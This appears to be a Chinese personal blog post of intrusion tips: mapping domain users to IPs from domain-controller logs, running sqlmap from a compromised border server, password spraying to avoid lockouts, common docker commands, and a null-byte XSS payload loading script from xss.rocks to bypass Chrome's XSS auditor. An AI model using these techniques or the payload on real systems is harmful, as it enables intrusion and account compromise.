---
title: 技巧总结1
layout: post
tags:
  - sec
  - skills
category: 
  - hack
  - skills
comments: true
share: true
---


<!--more-->


## 域内定位人


域内定位人技巧：直接导出dc日志，即可将用户名和ip对应起来。

## 网速限制

在通过边界服务器搞内网服务的时候，通常网速会成为一个很大的限制因素，这时候，可将工具直接部署在边界服务器上，例如sqlmap等，在边界服务器直接操作，此时内网对内网，网速极快，后将结果拖回到本地处理，这样避免了使用代理造成的各种网络延迟阻塞问题。

## 密码爆破

使用一个弱口令去跑用户名字典，以防止账号被锁定。


## docker常用命令


1.加载镜像（tar包）

```css
docker load<xxx.tar
```

2.查看tar是否加载成功

```css
docker images
```

3.查看是否有运行中的镜像

```css
docker ps 
```

4.显示所有的镜像

```css
docker ps -a
```

5.运行镜像

```css
docker run --name=临时名 -p 对外的端口:对内的端口（dokcer内部的）  -itd image_name(镜像名，加载后的名字) /bin/bash

docker run --rm -it -p 8080:80 镜像临时名称

```

6.进入镜像内部操作

```css
docker exec -it 临时名 /bin/bash(镜像shell地址)
```

7.退出镜像内部

```css
exit
```
8.保存镜像

```css
docker commit 临时名 镜像名
```

9.导出镜像

```css
docker save 镜像名>镜像名.tar
```

10.备注

启动项在 /root/start.sh

11.删除正在运行的镜像

```css
docker stop name&&docker rm name
```

12.端口映射

```css
docker run -p 80:80 --name 临时名称 -d 镜像名称
```

13.将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。

```css
docker cp /www/runoob 96f7f14e99ab:/www/
```

14.将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。

```css
docker cp /www/runoob 96f7f14e99ab:/www
```

15.将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。

```css
docker cp  96f7f14e99ab:/www /tmp/
```

## 绕过chrome的xss审计



```javascript
%00%00%00%00%00%00%00<script%20src=http://xss.rocks/xss.js  ></script>
```